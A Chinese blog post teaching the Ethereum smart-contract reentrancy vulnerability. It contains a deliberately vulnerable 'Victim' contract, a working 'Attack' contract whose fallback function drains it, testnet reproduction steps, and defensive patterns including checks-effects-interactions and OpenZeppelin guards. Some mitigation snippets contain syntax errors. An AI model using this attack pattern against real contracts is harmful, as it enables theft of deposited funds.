<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="Sissice">
    
    <title>
        
            智能合约重入漏洞 |
        
        Sissice&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/tou.png">
    
<link rel="stylesheet" href="/css/font-awesome.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/tou.png","favicon":"/images/tou.png","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                Sissice&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">智能合约重入漏洞</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/tou.png">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">Sissice</span>
                        
                            <span class="author-label">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;2021-11-09 22:23:21
    </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/">智能合约</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>2.3k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>10 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <p>文章首发：<a class="link" target="_blank" rel="noopener" href="https://forum.butian.net/share/878">奇安信攻防社区<i class="fas fa-external-link-alt"></i></a></p>
<p>重⼊攻击，可能是最着名的以太坊漏洞。合约在开发过程中，使用了危险的函数，并且使用不安全的交互模式。两者叠加在一起造就了以太坊非常经典的重入漏洞。其中最有代表性的攻击是 <a class="link" target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/The_DAO_(organization)">The DAO<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>外部恶意合约回调了受攻击合约上的一个函数，并在受攻击合约上的任意位置“重新进入”代码执行。因为原合约的程序员可能没有预料到合约代码可以被”重入“，因此合约会出现不可预知的行为。在 gas 足够的情况下，合约之间甚至可以相互循环调用，直至达到 gas 的上限，但是如果循环中有转账之类的操作，就会导致严重的后果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint _amount) public &#123;</span><br><span class="line">	require(balances[msg.sender] &gt;= _amount)</span><br><span class="line">	msg.sender.call.value(_amount)();</span><br><span class="line">	balances[msg.sender] -= _amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img lazyload src="/images/loading.svg" data-src="image-20211025202430311.png" alt="image-20211025202430311"></p>
<p>其中，<code>fallback</code>函数是关键</p>
<h3 id="fallback函数"><a href="#fallback函数" class="headerlink" title="fallback函数"></a>fallback函数</h3><p>当我们调用某个智能合约时，如果指定的函数找不到，或者根本就没指定调用哪个函数（如向合约发送 ether）时，<code>fallback</code> 函数就会被调用。</p>
<p>向合约发送 send、transfer、call 消息时候都会调用 <code>fallback</code> 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 <code>fallback</code> 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 <code>fallback</code> 函数，这有可能导致循环调用。</p>
<p>而<code>fallback</code>函数是可以被重写的</p>
<p>如果构造一个 <code>fallback</code> 函数，函数里面也调用对方的 <code>withdraw</code> 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）</p>
<h2 id="漏洞demo"><a href="#漏洞demo" class="headerlink" title="漏洞demo"></a>漏洞demo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.10;</span><br><span class="line">contract Victim &#123;</span><br><span class="line">	mapping(address =&gt; uint) public balances;</span><br><span class="line">	address public owner;</span><br><span class="line">    </span><br><span class="line">    //构造函数，设定合约所有者</span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	//接收资金转入</span><br><span class="line">	function deposit() public payable &#123;</span><br><span class="line">		balances[msg.sender] += msg.value;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	//提款</span><br><span class="line">	function withdraw(uint _amount) public &#123;</span><br><span class="line">		require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">		msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">		balances[msg.sender] -= _amount;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	//查询余额</span><br><span class="line">	function getBalance() public view returns(uint) &#123;</span><br><span class="line">		return address(this).balance;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">	Victim public victim;</span><br><span class="line">	</span><br><span class="line">	//设定受害者合约地址</span><br><span class="line">	constructor(address _victimAddress) public &#123;</span><br><span class="line">		victim = Victim(_victimAddress);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	//重写fallback</span><br><span class="line">	fallback() external payable &#123;</span><br><span class="line">		if(address(victim).balance &gt;= 1 ether)&#123;</span><br><span class="line">			victim.withdraw(1 ether);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	//攻击，调用受害者的withdraw函数</span><br><span class="line">	function attack() external payable &#123;</span><br><span class="line">		require(msg.value &gt;= 1 ether);</span><br><span class="line">		victim.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">		victim.withdraw(1 ether);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	//查询余额</span><br><span class="line">	function getBalance() public view returns(uint) &#123;</span><br><span class="line">		return address(this).balance;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="虚拟机中"><a href="#虚拟机中" class="headerlink" title="虚拟机中"></a>虚拟机中</h3><ul>
<li>分别为受害者和攻击者创建一个合约</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="image-20211026111011420.png" alt="image-20211026111011420"></p>
<ul>
<li>用deposit函数为受害者设定一定余额</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="image-20211026111204753.png" alt="image-20211026111204753"></p>
<ul>
<li>检查受害者余额</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="image-20211026111231368.png" alt="image-20211026111231368"></p>
<ul>
<li>进行攻击</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="image-20211026111416824.png" alt="image-20211026111416824"></p>
<ul>
<li>检查攻击者和受害者的余额</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="image-20211026111626852.png" alt="image-20211026111626852"></p>
<p><img lazyload src="/images/loading.svg" data-src="image-20211026111639557.png" alt="image-20211026111639557"></p>
<h3 id="测试链上"><a href="#测试链上" class="headerlink" title="测试链上"></a>测试链上</h3><ul>
<li>部署受害者合约</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="image-20211030143200282.png" alt="image-20211030143200282"></p>
<ul>
<li><p>部署攻击者合约</p>
<p><img lazyload src="/images/loading.svg" data-src="image-20211030143902046.png" alt="image-20211030143902046"></p>
</li>
<li><p>为受害者合约打入2eth</p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="image-20211030144202275.png" alt="image-20211030144202275"></p>
<ul>
<li>攻击</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="image-20211030151853031.png" alt="image-20211030151853031"></p>
<ul>
<li>结果</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="image-20211030152110108.png" alt="image-20211030152110108"></p>
<p><img lazyload src="/images/loading.svg" data-src="image-20211030152151377.png" alt="image-20211030152151377"></p>
<p><img lazyload src="/images/loading.svg" data-src="image-20211030152237814.png" alt="image-20211030152237814"></p>
<h3 id="重入次数"><a href="#重入次数" class="headerlink" title="重入次数"></a>重入次数</h3><p>由于gas的限制，重入次数是有一定限制的</p>
<p>调整参数，实验出最高重入次数</p>
<p>可以在区块链浏览器上查询到重入的次数</p>
<p><img lazyload src="/images/loading.svg" data-src="image-20211110234242078.png" alt="image-20211110234242078"></p>
<p>大约是9次</p>
<p>注意，一旦 out of gas 就会攻击失败。</p>
<p>可以通过使用for循环、用受害者合约的某些状态、用if判断来控制重入次数</p>
<h2 id="规避建议"><a href="#规避建议" class="headerlink" title="规避建议"></a>规避建议</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>总是用 <code>send()</code>或<code>transfer()</code> 来发送 ether，而不是用 <code>call.value()</code>。因为transfer和send函数的gas仅有2300，这点gas仅够捕获一个event，所以将无法进行可重入攻击。</p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>确保在执行外部调用之前已经更新了所有的内部状态，这一模式被称为：Checks-Effects-Interactions（“检查-生效-交互”）</p>
<p>第一步，大多数函数会先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的以太币Ether ，用户是否具有token等等）。这些检查工作应该首先被完成。</p>
<p>第二步，如果所有检查都通过了，接下来进行更改合约状态变量的操作。</p>
<p>第三步，与其它合约的交互应该是任何函数的最后一步。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require(balances[msg.sender] &gt; amount); //检查</span><br><span class="line">require(this.balance &gt; amount); //检查</span><br><span class="line">balances[msg.sender] -= amount; // 生效</span><br><span class="line">to.call.value(amount)();  // 交互</span><br></pre></td></tr></table></figure>

<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><ol>
<li>使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，可防止重入调用</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bool reEntrancyMutex = false;</span><br><span class="line">function withdraw(uint _amount) public &#123;</span><br><span class="line">	require(!reEntrancyMutex);</span><br><span class="line">	reEntrancyMutex = true;</span><br><span class="line">	require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">	msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">	balances[msg.sender] -= _amount;</span><br><span class="line">	reEntrancyMutex = false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用OpenZeppelin官方的<a class="link" target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol">ReentrancyGuard合约<i class="fas fa-external-link-alt"></i></a>的<code>nonReentrant</code> modifier。</li>
</ol>
<p>与互斥锁的思想差不多，但是其官方将其封装成函数修饰词使用。</p>
<p>在函数中增加<code>nonReentrant</code> modifier可保证其不可重入，任何对该函数的重入操作都将以revert the call的方式来拒绝。</p>
<p>当合约中有多个函数时，由于modifier的粒度在单个函数，若想完全避免重入，应对每个函数都添加<code>nonReentrant</code> modifier。否则，仍然可以通过其他函数来重入然后发起重入攻击，若该函数可能破坏不变量。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts v4.3.2 (security/ReentrancyGuard.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Contract module that helps prevent reentrant calls to a function.</span><br><span class="line"> *</span><br><span class="line"> * Inheriting from `ReentrancyGuard` will make the &#123;nonReentrant&#125; modifier</span><br><span class="line"> * available, which can be applied to functions to make sure there are no nested</span><br><span class="line"> * (reentrant) calls to them.</span><br><span class="line"> *</span><br><span class="line"> * Note that because there is a single `nonReentrant` guard, functions marked as</span><br><span class="line"> * `nonReentrant` may not call one another. This can be worked around by making</span><br><span class="line"> * those functions `private`, and then adding `external` `nonReentrant` entry</span><br><span class="line"> * points to them.</span><br><span class="line"> *</span><br><span class="line"> * TIP: If you would like to learn more about reentrancy and alternative ways</span><br><span class="line"> * to protect against it, check out our blog post</span><br><span class="line"> * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].</span><br><span class="line"> */</span><br><span class="line">abstract contract ReentrancyGuard &#123;</span><br><span class="line">    // Booleans are more expensive than uint256 or any type that takes up a full</span><br><span class="line">    // word because each write operation emits an extra SLOAD to first read the</span><br><span class="line">    // slot&#x27;s contents, replace the bits taken up by the boolean, and then write</span><br><span class="line">    // back. This is the compiler&#x27;s defense against contract upgrades and</span><br><span class="line">    // pointer aliasing, and it cannot be disabled.</span><br><span class="line"></span><br><span class="line">    // The values being non-zero value makes deployment a bit more expensive,</span><br><span class="line">    // but in exchange the refund on every call to nonReentrant will be lower in</span><br><span class="line">    // amount. Since refunds are capped to a percentage of the total</span><br><span class="line">    // transaction&#x27;s gas, it is best to keep them low in cases like this one, to</span><br><span class="line">    // increase the likelihood of the full refund coming into effect.</span><br><span class="line">    uint256 private constant _NOT_ENTERED = 1;</span><br><span class="line">    uint256 private constant _ENTERED = 2;</span><br><span class="line"></span><br><span class="line">    uint256 private _status;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Prevents a contract from calling itself, directly or indirectly.</span><br><span class="line">     * Calling a `nonReentrant` function from another `nonReentrant`</span><br><span class="line">     * function is not supported. It is possible to prevent this from happening</span><br><span class="line">     * by making the `nonReentrant` function external, and making it call a</span><br><span class="line">     * `private` function that does the actual work.</span><br><span class="line">     */</span><br><span class="line">    modifier nonReentrant() &#123;</span><br><span class="line">        // On the first call to nonReentrant, _notEntered will be true</span><br><span class="line">        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);</span><br><span class="line"></span><br><span class="line">        // Any calls to nonReentrant after this point will fail</span><br><span class="line">        _status = _ENTERED;</span><br><span class="line"></span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">        // By storing the original value once again, a refund is triggered (see</span><br><span class="line">        // https://eips.ethereum.org/EIPS/eip-2200)</span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用采用pull payment模式，OpenZeppelin提供了<a class="link" target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/PullPayment.sol">PullPayment合约<i class="fas fa-external-link-alt"></i></a>。</li>
</ol>
<p>其提供了<code>_asyncTransfer</code>函数，与<code>transfer</code>类似。然而，它不会将资金发送给接收者，而是将其转移到托管合约中。此外，PullPayment还为接收者提供了一个公共功能来提取（pull）他们的支付：<code>withdrawPayments</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts v4.3.2 (security/PullPayment.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../utils/escrow/Escrow.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Simple implementation of a</span><br><span class="line"> * https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls[pull-payment]</span><br><span class="line"> * strategy, where the paying contract doesn&#x27;t interact directly with the</span><br><span class="line"> * receiver account, which must withdraw its payments itself.</span><br><span class="line"> *</span><br><span class="line"> * Pull-payments are often considered the best practice when it comes to sending</span><br><span class="line"> * Ether, security-wise. It prevents recipients from blocking execution, and</span><br><span class="line"> * eliminates reentrancy concerns.</span><br><span class="line"> *</span><br><span class="line"> * TIP: If you would like to learn more about reentrancy and alternative ways</span><br><span class="line"> * to protect against it, check out our blog post</span><br><span class="line"> * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].</span><br><span class="line"> *</span><br><span class="line"> * To use, derive from the `PullPayment` contract, and use &#123;_asyncTransfer&#125;</span><br><span class="line"> * instead of Solidity&#x27;s `transfer` function. Payees can query their due</span><br><span class="line"> * payments with &#123;payments&#125;, and retrieve them with &#123;withdrawPayments&#125;.</span><br><span class="line"> */</span><br><span class="line">abstract contract PullPayment &#123;</span><br><span class="line">    Escrow private immutable _escrow;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _escrow = new Escrow();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Withdraw accumulated payments, forwarding all gas to the recipient.</span><br><span class="line">     *</span><br><span class="line">     * Note that _any_ account can call this function, not just the `payee`.</span><br><span class="line">     * This means that contracts unaware of the `PullPayment` protocol can still</span><br><span class="line">     * receive funds this way, by having a separate account call</span><br><span class="line">     * &#123;withdrawPayments&#125;.</span><br><span class="line">     *</span><br><span class="line">     * WARNING: Forwarding all gas opens the door to reentrancy vulnerabilities.</span><br><span class="line">     * Make sure you trust the recipient, or are either following the</span><br><span class="line">     * checks-effects-interactions pattern or using &#123;ReentrancyGuard&#125;.</span><br><span class="line">     *</span><br><span class="line">     * @param payee Whose payments will be withdrawn.</span><br><span class="line">     */</span><br><span class="line">    function withdrawPayments(address payable payee) public virtual &#123;</span><br><span class="line">        _escrow.withdraw(payee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the payments owed to an address.</span><br><span class="line">     * @param dest The creditor&#x27;s address.</span><br><span class="line">     */</span><br><span class="line">    function payments(address dest) public view returns (uint256) &#123;</span><br><span class="line">        return _escrow.depositsOf(dest);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Called by the payer to store the sent amount as credit to be pulled.</span><br><span class="line">     * Funds sent in this way are stored in an intermediate &#123;Escrow&#125; contract, so</span><br><span class="line">     * there is no danger of them being spent before withdrawal.</span><br><span class="line">     *</span><br><span class="line">     * @param dest The destination address of the funds.</span><br><span class="line">     * @param amount The amount to transfer.</span><br><span class="line">     */</span><br><span class="line">    function _asyncTransfer(address dest, uint256 amount) internal virtual &#123;</span><br><span class="line">        _escrow.deposit&#123;value: amount&#125;(dest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里，合约资金被发送给中介托管:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function sendPayment(address user, address escrow) external &#123;</span><br><span class="line">  require(msg.sender == authorized);  </span><br><span class="line">  uint userBalance = userBalances[user];  </span><br><span class="line">  require(userBalance &gt; 0);  </span><br><span class="line">  userBalances[user] = 0;  </span><br><span class="line">  (bool success,) = escrow.call&#123; value: userBalance &#125;(&quot;&quot;);</span><br><span class="line">  require(success,);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里，托管资金可以由接收者提取:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function pullPayment() external &#123;</span><br><span class="line">  require(msg.sender == receiver);  </span><br><span class="line">  uint payment = account(this).balance;  </span><br><span class="line">  (bool success,) = msg.sender.call&#123; value: payment &#125;(&quot;&quot;);</span><br><span class="line">  require(success,);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

        </div>

        
            <div class="post-copyright-info">
                <div class="article-copyright-info-container">
    <ul>
        <li>Post title：智能合约重入漏洞</li>
        <li>Post author：Sissice</li>
        <li>Create time：2021-11-09 22:23:21</li>
        <li>
            Post link：https://sissice.github.io/2021/11/09/智能合约重入漏洞/
        </li>
        <li>
            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
        </li>
    </ul>
</div>

            </div>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">智能合约错误随机性</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
            </div>
        

        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span>
              -
            
            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">Sissice</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

